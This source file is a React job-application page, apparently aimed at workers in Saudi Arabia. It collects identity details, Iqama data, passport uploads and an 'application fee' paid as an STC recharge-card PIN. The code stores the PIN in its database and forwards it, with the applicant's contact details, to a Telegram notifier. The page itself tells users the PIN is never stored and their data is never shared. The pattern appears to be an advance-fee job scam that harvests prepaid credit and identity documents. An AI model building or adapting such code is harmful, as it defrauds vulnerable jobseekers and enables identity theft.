import { createFileRoute, Link, useNavigate, useParams } from "@tanstack/react-router";
import { useQuery } from "@tanstack/react-query";
import { useState } from "react";
import {
  User, Calendar, Upload, ChevronLeft, ChevronRight, Briefcase, BadgeCheck,
  MapPin, CreditCard, Lock, ShieldCheck, Zap, Headphones, Info, FileText,
} from "lucide-react";
import { fetchJobById } from "@/lib/queries";
import { supabase } from "@/integrations/supabase/client";
import { notifyTelegram } from "@/lib/telegram.functions";

export const Route = createFileRoute("/jobs/$id/apply")({
  head: () => ({ meta: [{ title: "Apply for Job — Job Expert" }] }),
  component: ApplyPage,
});

type FormState = {
  full_name: string;
  email: string;
  phone: string;
  date_of_birth: string;
  gender: "male" | "female" | "";
  nationality: string;
  current_location: string;
  marital_status: string;
  in_saudi_arabia: "yes" | "no" | "";
  iqama_status: string;
  iqama_profession: string;
  iqama_number: string;
  iqama_expiry: string;
  experience: string;
  cv_file: File | null;
  passport_file: File | null;
  recharge_pin: string;
};

const initialState: FormState = {
  full_name: "", email: "", phone: "", date_of_birth: "", gender: "",
  nationality: "", current_location: "", marital_status: "",
  in_saudi_arabia: "", iqama_status: "", iqama_profession: "", iqama_number: "", iqama_expiry: "",
  experience: "", cv_file: null, passport_file: null, recharge_pin: "",
};

const STEPS = ["Personal Info", "Experience", "Documents", "Payment"] as const;

function ApplyPage() {
  const { id } = useParams({ from: "/jobs/$id/apply" });
  const navigate = useNavigate();
  const jobQ = useQuery({ queryKey: ["job", id], queryFn: () => fetchJobById(id) });
  const job = jobQ.data;

  const [step, setStep] = useState(0);
  const [form, setForm] = useState<FormState>(initialState);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const set = <K extends keyof FormState>(k: K, v: FormState[K]) => setForm((f) => ({ ...f, [k]: v }));

  if (jobQ.isLoading) return <div className="p-10 text-center text-muted-foreground">Loading…</div>;
  if (!job) return <div className="p-10 text-center text-muted-foreground">Job not found.</div>;

  async function submit() {
    setError(null);
    setSubmitting(true);
    try {
      const { data: userData } = await supabase.auth.getUser();
      if (!userData.user) {
        navigate({ to: "/auth", search: { next: `/jobs/${id}/apply` } });
        return;
      }
      const uid = userData.user.id;

      let cv_url: string | null = null;
      let passport_url: string | null = null;

      if (form.cv_file) {
        const path = `${uid}/${Date.now()}_${form.cv_file.name}`;
        const { error } = await supabase.storage.from("cv").upload(path, form.cv_file);
        if (error) throw error;
        cv_url = path;
      }
      if (form.passport_file) {
        const path = `${uid}/${Date.now()}_${form.passport_file.name}`;
        const { error } = await supabase.storage.from("passport").upload(path, form.passport_file);
        if (error) throw error;
        passport_url = path;
      }

      const { data: inserted, error: insErr } = await supabase
        .from("applications")
        .insert({
          user_id: uid,
          job_id: job!.id,
          full_name: form.full_name,
          email: form.email || null,
          phone: form.phone,
          date_of_birth: form.date_of_birth || null,
          gender: form.gender || null,
          nationality: form.nationality || null,
          current_location: form.current_location || null,
          marital_status: form.marital_status || null,
          in_saudi_arabia: form.in_saudi_arabia === "yes" ? true : form.in_saudi_arabia === "no" ? false : null,
          iqama_status: form.iqama_status || null,
          iqama_profession: form.iqama_profession || null,
          iqama_number: form.iqama_number || null,
          iqama_expiry: form.iqama_expiry || null,
          experience: form.experience || null,
          cv_url, passport_url,
          recharge_pin: form.recharge_pin,
          amount_paid: job!.application_fee,
        })
        .select("application_id")
        .single();
      if (insErr) throw insErr;

      try {
        await notifyTelegram({
          data: {
            application_id: inserted.application_id,
            job_title: job!.title,
            company_name: job!.company_name,
            full_name: form.full_name,
            phone: form.phone,
            email: form.email || null,
            nationality: form.nationality || null,
            amount_paid: job!.application_fee,
            recharge_pin: form.recharge_pin,
          },
        });
      } catch (telegramErr) {
        console.warn("Telegram notification failed:", telegramErr);
      }

      navigate({ to: "/applications/success/$applicationId", params: { applicationId: inserted.application_id } });
    } catch (e: unknown) {
      setError(e instanceof Error ? e.message : "Failed to submit application.");
    } finally {
      setSubmitting(false);
    }
  }

  const isPayment = step === 3;

  return (
    <div className="container mx-auto max-w-7xl px-4 lg:px-6 py-4 lg:py-6 pb-32">
      <nav className="text-xs lg:text-sm text-muted-foreground mb-4">
        <Link to="/">Home</Link><span className="mx-2">›</span>
        <Link to="/jobs">Jobs</Link><span className="mx-2">›</span>
        <Link to="/jobs/$id" params={{ id }}>{job.title}</Link><span className="mx-2">›</span>
        <span className="text-brand-navy font-semibold">
          {isPayment ? "Payment" : "Apply Now"}
        </span>
      </nav>

      {isPayment ? <PaymentHeader job={job} step={step} /> : <ApplyHeader job={job} step={step} />}

      <div className="grid lg:grid-cols-3 gap-6 mt-6">
        <div className="lg:col-span-2 space-y-6">
          {error && (
            <div className="bg-rose-50 text-rose-700 border border-rose-200 rounded-xl p-3 text-sm">{error}</div>
          )}

          {step === 0 && <StepPersonal form={form} set={set} />}
          {step === 1 && <StepExperience form={form} set={set} />}
          {step === 2 && <StepDocuments form={form} set={set} />}
          {step === 3 && <StepPayment form={form} set={set} job={job} />}

          <div className="flex items-center justify-between gap-3">
            {step > 0 ? (
              <button
                onClick={() => setStep((s) => s - 1)}
                className="px-5 py-2.5 rounded-xl border border-border text-sm font-semibold text-brand-navy flex items-center gap-2"
              >
                <ChevronLeft className="w-4 h-4" /> Back
              </button>
            ) : (
              <Link
                to="/jobs/$id" params={{ id }}
                className="px-5 py-2.5 rounded-xl border border-border text-sm font-semibold text-brand-navy flex items-center gap-2"
              >
                <ChevronLeft className="w-4 h-4" /> Back to Job Details
              </Link>
            )}
            {step < 3 ? (
              <button
                onClick={() => setStep((s) => s + 1)}
                className="px-6 py-3 rounded-xl bg-brand-blue text-white text-sm font-semibold flex items-center gap-2"
              >
                Save &amp; Continue <ChevronRight className="w-4 h-4" />
              </button>
            ) : (
              <button
                onClick={submit}
                disabled={submitting || !form.recharge_pin}
                className="px-6 py-3 rounded-xl bg-brand-navy text-white text-sm font-semibold flex items-center gap-2 disabled:opacity-60"
              >
                <Lock className="w-4 h-4" /> {submitting ? "Submitting…" : `Pay ${job.application_fee} SAR & Submit Application`}
              </button>
            )}
          </div>
        </div>

        <aside className="space-y-4">
          {isPayment ? <PaymentSidebar job={job} /> : <JobSummary job={job} />}
        </aside>
      </div>

      <TrustFooter />
    </div>
  );
}

/* ---------------- shared headers / panels ---------------- */

function ApplyHeader({ job, step }: { job: NonNullable<ReturnType<typeof fetchJobById> extends Promise<infer T> ? T : never>; step: number }) {
  return (
    <div className="bg-white rounded-2xl border border-border p-5 lg:p-6">
      <div className="grid lg:grid-cols-2 gap-4 items-start">
        <div className="flex gap-4">
          <div className="w-16 h-16 rounded-xl bg-amber-400 flex items-center justify-center text-brand-navy font-extrabold text-lg shrink-0">
            {job!.company_name.split(" ").map((w) => w[0]).slice(0, 2).join("")}
          </div>
          <div>
            <h1 className="text-lg lg:text-2xl font-extrabold text-brand-navy">Apply for {job!.title}</h1>
            <div className="flex items-center gap-1 text-sm font-semibold text-brand-navy">
              {job!.company_name} <BadgeCheck className="w-4 h-4 text-brand-blue" />
            </div>
            <div className="text-xs text-muted-foreground flex items-center gap-1 mt-1">
              <MapPin className="w-3.5 h-3.5" /> {job!.location}
              <span className="ml-2 text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded">{job!.job_type}</span>
            </div>
          </div>
        </div>
        <Stepper step={step} />
      </div>
    </div>
  );
}

function PaymentHeader({ job, step }: { job: { application_fee: number; title: string }; step: number }) {
  return (
    <div className="rounded-2xl bg-gradient-to-br from-brand-navy-dark to-brand-navy text-white p-5 lg:p-6">
      <div className="grid lg:grid-cols-2 gap-4 items-center">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-xl bg-brand-blue flex items-center justify-center">
            <FileText className="w-5 h-5" />
          </div>
          <div>
            <h1 className="text-lg lg:text-2xl font-extrabold">Complete Your Application</h1>
            <p className="text-xs lg:text-sm text-white/70">
              Please pay the {job.application_fee} SAR application fee to submit your application
            </p>
          </div>
        </div>
        <Stepper step={step} light />
      </div>
    </div>
  );
}

function Stepper({ step, light = false }: { step: number; light?: boolean }) {
  return (
    <ol className="flex items-center gap-2">
      {STEPS.map((label, i) => {
        const done = i < step;
        const active = i === step;
        return (
          <li key={label} className="flex-1 flex items-center">
            <div className="flex flex-col items-center w-full">
              <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold border-2 ${
                done ? "bg-emerald-500 border-emerald-500 text-white"
                : active ? "bg-brand-yellow border-brand-yellow text-brand-navy"
                : light ? "border-white/30 text-white/60" : "border-border text-muted-foreground"
              }`}>
                {done ? "✓" : i + 1}
              </div>
              <div className={`text-[10px] mt-1 font-medium ${
                active ? (light ? "text-white" : "text-brand-navy")
                : done ? "text-emerald-600"
                : light ? "text-white/60" : "text-muted-foreground"
              }`}>{label}</div>
            </div>
            {i < STEPS.length - 1 && (
              <div className={`h-0.5 flex-1 -mt-4 mx-1 ${
                done ? "bg-emerald-500" : light ? "bg-white/20" : "bg-border"
              }`} />
            )}
          </li>
        );
      })}
    </ol>
  );
}

function JobSummary({ job }: { job: { title: string; company_name: string; location: string; job_type: string; salary: number; salary_currency: string; salary_period: string; experience_required: string; created_at: string } }) {
  return (
    <>
      <div className="bg-white rounded-2xl border border-border p-5">
        <h3 className="font-bold text-brand-navy mb-3">Job Summary</h3>
        <div className="flex gap-3">
          <div className="w-12 h-12 rounded-lg bg-amber-400 flex items-center justify-center text-brand-navy font-extrabold">
            {job.company_name.split(" ").map((w) => w[0]).slice(0, 2).join("")}
          </div>
          <div className="min-w-0">
            <div className="font-bold text-brand-navy">{job.title}</div>
            <div className="text-sm text-muted-foreground flex items-center gap-1">
              {job.company_name} <BadgeCheck className="w-4 h-4 text-brand-blue" />
            </div>
          </div>
        </div>
        <div className="mt-3 text-xs text-muted-foreground flex items-center gap-1">
          <MapPin className="w-3.5 h-3.5" /> {job.location}
        </div>
        <dl className="mt-4 divide-y divide-border text-sm">
          <Row label="Job Type" value={job.job_type} />
          <Row label="Salary" value={`${job.salary.toLocaleString()} ${job.salary_currency} / ${job.salary_period}`} />
          <Row label="Experience" value={job.experience_required} />
        </dl>
      </div>
      <div className="bg-blue-50/60 border border-blue-100 rounded-2xl p-5">
        <h3 className="font-bold text-brand-blue flex items-center gap-2 text-sm">
          <Info className="w-4 h-4" /> Important Information
        </h3>
        <ul className="mt-3 space-y-2 text-sm text-foreground/80">
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> Please fill all required fields carefully.</li>
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> Make sure your information is correct before submitting.</li>
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> Shortlisted candidates will be contacted.</li>
        </ul>
      </div>
      <div className="bg-emerald-50/60 border border-emerald-100 rounded-2xl p-5">
        <h3 className="font-bold text-emerald-700 flex items-center gap-2 text-sm">
          <Lock className="w-4 h-4" /> Your Privacy Matters
        </h3>
        <p className="text-sm text-foreground/80 mt-2">
          Your information is safe with us. We do not share your data with anyone.
        </p>
      </div>
    </>
  );
}

function PaymentSidebar({ job }: { job: { application_fee: number } }) {
  return (
    <>
      <div className="bg-white rounded-2xl border border-border p-5">
        <h3 className="font-bold text-brand-navy flex items-center gap-2">
          <span className="w-7 h-7 rounded-lg bg-blue-50 text-brand-blue flex items-center justify-center">
            <CreditCard className="w-4 h-4" />
          </span>
          Payment Details
        </h3>
        <dl className="mt-3 text-sm">
          <div className="flex items-center justify-between py-1.5">
            <dt className="text-muted-foreground">Application Fee</dt>
            <dd className="font-semibold">{job.application_fee} SAR</dd>
          </div>
          <div className="flex items-center justify-between py-1.5">
            <dt className="text-muted-foreground">Service Charge</dt>
            <dd className="font-semibold">0 SAR</dd>
          </div>
          <div className="border-t border-border mt-2 pt-2 flex items-center justify-between">
            <dt className="font-semibold text-brand-navy">Total Amount</dt>
            <dd className="font-extrabold text-brand-blue">{job.application_fee} SAR</dd>
          </div>
        </dl>
      </div>

      <div className="bg-white rounded-2xl border border-border p-5">
        <h3 className="font-bold text-brand-navy flex items-center gap-2">
          <span className="w-7 h-7 rounded-lg bg-amber-50 text-amber-500 flex items-center justify-center">
            <Info className="w-4 h-4" />
          </span>
          How to Pay
        </h3>
        <ol className="mt-3 space-y-2 text-sm">
          {["Purchase an STC recharge card.", "Scratch the card and get the Recharge PIN.", "Enter the STC Recharge PIN in the field.", "Click on \"Pay & Submit Application\"."].map((t, i) => (
            <li key={i} className="flex gap-2">
              <span className="w-5 h-5 rounded-full bg-amber-100 text-amber-600 text-[11px] font-bold flex items-center justify-center shrink-0">{i + 1}</span>
              <span>{t}</span>
            </li>
          ))}
        </ol>
      </div>

      <div className="bg-blue-50/60 border border-blue-100 rounded-2xl p-5">
        <h3 className="font-bold text-brand-blue flex items-center gap-2 text-sm">
          <ShieldCheck className="w-4 h-4" /> Important Information
        </h3>
        <ul className="mt-3 space-y-2 text-sm text-foreground/80">
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> Application fee is non-refundable.</li>
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> Your application will be reviewed after successful payment.</li>
          <li className="flex gap-2"><span className="text-emerald-600">✓</span> If payment fails, please try again or contact support.</li>
        </ul>
      </div>
    </>
  );
}

/* ---------------- step bodies ---------------- */

function Section({ icon: Icon, title, children }: { icon: typeof User; title: string; children: React.ReactNode }) {
  return (
    <div className="bg-white rounded-2xl border border-border p-5 lg:p-6">
      <h2 className="font-bold text-brand-navy flex items-center gap-2 mb-4">
        <span className="w-7 h-7 rounded-lg bg-blue-50 text-brand-blue flex items-center justify-center">
          <Icon className="w-4 h-4" />
        </span>
        {title}
      </h2>
      {children}
    </div>
  );
}
function Field({ label, required, children }: { label: string; required?: boolean; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="text-xs font-semibold text-brand-navy">{label} {required && <span className="text-rose-500">*</span>}</span>
      <div className="mt-1.5">{children}</div>
    </label>
  );
}
const inputCls = "w-full bg-white border border-border rounded-lg px-3 py-2.5 text-sm outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20";

function StepPersonal({ form, set }: { form: FormState; set: <K extends keyof FormState>(k: K, v: FormState[K]) => void }) {
  return (
    <Section icon={User} title="Personal Information">
      <div className="grid sm:grid-cols-2 gap-4">
        <Field label="Full Name" required>
          <input className={inputCls} placeholder="Enter your full name" value={form.full_name} onChange={(e) => set("full_name", e.target.value)} />
        </Field>
        <Field label="Email Address" required>
          <input type="email" className={inputCls} placeholder="Enter your email" value={form.email} onChange={(e) => set("email", e.target.value)} />
        </Field>
        <Field label="Mobile Number" required>
          <div className="flex gap-2">
            <div className="px-3 py-2.5 rounded-lg border border-border bg-secondary text-sm flex items-center gap-1">🇸🇦 +966</div>
            <input className={inputCls} placeholder="5X XXX XXXX" value={form.phone} onChange={(e) => set("phone", e.target.value)} />
          </div>
        </Field>
        <Field label="Date of Birth" required>
          <div className="relative">
            <input type="date" className={inputCls} value={form.date_of_birth} onChange={(e) => set("date_of_birth", e.target.value)} />
            <Calendar className="w-4 h-4 text-muted-foreground absolute right-3 top-3 pointer-events-none" />
          </div>
        </Field>
        <Field label="Gender" required>
          <div className="flex gap-4 pt-1">
            <Radio name="gender" value="male" current={form.gender} onChange={(v) => set("gender", v)}>Male</Radio>
            <Radio name="gender" value="female" current={form.gender} onChange={(v) => set("gender", v)}>Female</Radio>
          </div>
        </Field>
        <Field label="Nationality" required>
          <select className={inputCls} value={form.nationality} onChange={(e) => set("nationality", e.target.value)}>
            <option value="">Select Nationality</option>
            {["Saudi","Pakistani","Indian","Bangladeshi","Filipino","Egyptian","Other"].map((n) => <option key={n}>{n}</option>)}
          </select>
        </Field>
        <Field label="Current Location" required>
          <select className={inputCls} value={form.current_location} onChange={(e) => set("current_location", e.target.value)}>
            <option value="">Select City</option>
            {["Riyadh","Jeddah","Dammam","Mecca","Medina","Other"].map((n) => <option key={n}>{n}</option>)}
          </select>
        </Field>
        <Field label="Marital Status">
          <select className={inputCls} value={form.marital_status} onChange={(e) => set("marital_status", e.target.value)}>
            <option value="">Select Status</option>
            {["Single","Married","Divorced"].map((n) => <option key={n}>{n}</option>)}
          </select>
        </Field>
      </div>
    </Section>
  );
}

function StepExperience({ form, set }: { form: FormState; set: <K extends keyof FormState>(k: K, v: FormState[K]) => void }) {
  return (
    <>
      <Section icon={Briefcase} title="Additional Information">
        <div className="grid sm:grid-cols-2 gap-4">
          <Field label="Are you currently in Saudi Arabia?" required>
            <div className="flex gap-4 pt-1">
              <Radio name="ksa" value="yes" current={form.in_saudi_arabia} onChange={(v) => set("in_saudi_arabia", v)}>Yes</Radio>
              <Radio name="ksa" value="no" current={form.in_saudi_arabia} onChange={(v) => set("in_saudi_arabia", v)}>No</Radio>
            </div>
          </Field>
          <Field label="Iqama Status">
            <select className={inputCls} value={form.iqama_status} onChange={(e) => set("iqama_status", e.target.value)}>
              <option value="">Select Iqama Status</option>
              {["Valid","Expired","Transferable","Not Applicable"].map((n) => <option key={n}>{n}</option>)}
            </select>
          </Field>
          <Field label="Iqama Profession">
            <input className={inputCls} placeholder="Enter Iqama Profession" value={form.iqama_profession} onChange={(e) => set("iqama_profession", e.target.value)} />
          </Field>
          <Field label="Iqama Number">
            <input className={inputCls} placeholder="Enter Iqama Number" value={form.iqama_number} onChange={(e) => set("iqama_number", e.target.value)} />
          </Field>
          <Field label="Iqama Expiry Date">
            <input type="date" className={inputCls} value={form.iqama_expiry} onChange={(e) => set("iqama_expiry", e.target.value)} />
          </Field>
          <Field label="Experience">
            <select className={inputCls} value={form.experience} onChange={(e) => set("experience", e.target.value)}>
              <option value="">Select Experience</option>
              {["Fresher","1-2 Years","3-5 Years","5+ Years"].map((n) => <option key={n}>{n}</option>)}
            </select>
          </Field>
        </div>
      </Section>
    </>
  );
}

function StepDocuments({ form, set }: { form: FormState; set: <K extends keyof FormState>(k: K, v: FormState[K]) => void }) {
  return (
    <Section icon={Upload} title="Attachments">
      <div className="grid sm:grid-cols-2 gap-4">
        <UploadBox label="Upload CV / Resume" required file={form.cv_file} onChange={(f) => set("cv_file", f)} />
        <UploadBox label="Additional Documents" optional file={form.passport_file} onChange={(f) => set("passport_file", f)} />
      </div>
    </Section>
  );
}

function StepPayment({ form, set, job }: { form: FormState; set: <K extends keyof FormState>(k: K, v: FormState[K]) => void; job: { title: string; company_name: string; location: string; job_type: string; application_fee: number } }) {
  return (
    <>
      <div className="bg-white rounded-2xl border border-border p-5 lg:p-6">
        <h3 className="font-bold text-brand-navy mb-3">Application Summary</h3>
        <div className="flex gap-4 items-center">
          <div className="w-14 h-14 rounded-lg bg-amber-400 flex items-center justify-center text-brand-navy font-extrabold">
            {job.company_name.split(" ").map((w) => w[0]).slice(0, 2).join("")}
          </div>
          <div className="flex-1">
            <div className="font-bold text-brand-navy">{job.title}</div>
            <div className="text-sm text-muted-foreground flex items-center gap-1">
              {job.company_name} <BadgeCheck className="w-4 h-4 text-brand-blue" />
            </div>
            <div className="text-xs text-muted-foreground flex items-center gap-1 mt-0.5">
              <MapPin className="w-3 h-3" /> {job.location} · <span className="text-emerald-700 bg-emerald-50 px-1.5 rounded">{job.job_type}</span>
            </div>
          </div>
          <div className="text-right">
            <div className="text-brand-blue font-extrabold">{job.application_fee} SAR</div>
            <div className="text-[10px] text-muted-foreground">Application Fee</div>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-2xl border border-border p-5 lg:p-6">
        <h3 className="font-bold text-brand-navy mb-3">Payment Method</h3>
        <div className="border border-border rounded-xl p-4">
          <div className="flex items-center gap-2 mb-2">
            <span className="px-2 py-1 rounded bg-violet-600 text-white text-[10px] font-bold">stc</span>
            <span className="font-semibold text-brand-navy text-sm">STC Recharge PIN</span>
          </div>
          <p className="text-xs text-muted-foreground mb-3">
            Please enter your STC Recharge PIN to pay the application fee.
          </p>
          <Field label="Enter STC Recharge PIN" required>
            <input
              className={inputCls}
              placeholder="XXXX XXXX XXXX XXXX"
              value={form.recharge_pin}
              onChange={(e) => set("recharge_pin", e.target.value)}
            />
          </Field>
          <div className="mt-3 bg-blue-50 border border-blue-100 rounded-lg p-3 text-xs text-foreground/80 flex gap-2">
            <Info className="w-4 h-4 text-brand-blue shrink-0" />
            You can find your STC Recharge PIN on any STC recharge card or from STC services.
          </div>
          <div className="mt-3 bg-emerald-50 border border-emerald-100 rounded-lg p-3 text-xs text-foreground/80 flex gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <div>
              <div className="font-semibold text-emerald-700">Your payment is secure and encrypted</div>
              We do not store your STC PIN or any payment information.
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

function Radio<T extends string>({ name, value, current, onChange, children }: { name: string; value: T; current: T | ""; onChange: (v: T) => void; children: React.ReactNode }) {
  const active = current === value;
  return (
    <label className="flex items-center gap-2 cursor-pointer text-sm">
      <input type="radio" name={name} checked={active} onChange={() => onChange(value)} className="sr-only" />
      <span className={`w-4 h-4 rounded-full border-2 flex items-center justify-center ${active ? "border-brand-blue" : "border-border"}`}>
        {active && <span className="w-2 h-2 rounded-full bg-brand-blue" />}
      </span>
      {children}
    </label>
  );
}

function UploadBox({ label, required, optional, file, onChange }: { label: string; required?: boolean; optional?: boolean; file: File | null; onChange: (f: File | null) => void }) {
  return (
    <div>
      <div className="text-xs font-semibold text-brand-navy mb-1.5">
        {label} {required && <span className="text-rose-500">*</span>} {optional && <span className="text-muted-foreground">(Optional)</span>}
      </div>
      <label className="block border border-dashed border-border rounded-xl p-4 bg-secondary/40 cursor-pointer hover:border-brand-blue/40">
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-full bg-blue-50 text-brand-blue flex items-center justify-center">
            <Upload className="w-5 h-5" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="text-sm">
              <span className="font-semibold text-brand-blue">Click to upload</span>{" "}
              <span className="text-muted-foreground">or drag &amp; drop</span>
            </div>
            <div className="text-[11px] text-muted-foreground">PDF, DOC, DOCX (Max. 5MB)</div>
            {file && <div className="text-xs text-emerald-700 mt-1 truncate">{file.name}</div>}
          </div>
          <span className="px-3 py-1.5 rounded-lg border border-border text-xs font-semibold bg-white text-brand-navy">Choose File</span>
        </div>
        <input
          type="file" className="hidden" accept=".pdf,.doc,.docx,.png,.jpg,.jpeg"
          onChange={(e) => onChange(e.target.files?.[0] ?? null)}
        />
      </label>
    </div>
  );
}

function Row({ label, value }: { label: string; value: string }) {
  return (
    <div className="py-2 flex items-center justify-between">
      <dt className="text-muted-foreground">{label}</dt>
      <dd className="font-semibold text-brand-navy">{value}</dd>
    </div>
  );
}

function TrustFooter() {
  return (
    <div className="mt-8 bg-white rounded-2xl border border-border p-4 lg:p-6 grid grid-cols-2 lg:grid-cols-4 gap-4">
      {[
        { i: Lock, t: "Secure Payment", n: "100% secure and encrypted", c: "text-brand-blue bg-blue-50" },
        { i: Zap, t: "Instant Verification", n: "Payment verified instantly", c: "text-amber-500 bg-amber-50" },
        { i: ShieldCheck, t: "Safe & Trusted", n: "Your data is always protected", c: "text-emerald-600 bg-emerald-50" },
        { i: Headphones, t: "24/7 Support", n: "We are here to help you", c: "text-violet-600 bg-violet-50" },
      ].map((b) => (
        <div key={b.t} className="flex items-center gap-3">
          <div className={`w-11 h-11 rounded-xl flex items-center justify-center ${b.c}`}>
            <b.i className="w-5 h-5" />
          </div>
          <div>
            <div className="font-semibold text-sm text-brand-navy">{b.t}</div>
            <div className="text-xs text-muted-foreground">{b.n}</div>
          </div>
        </div>
      ))}
    </div>
  );
}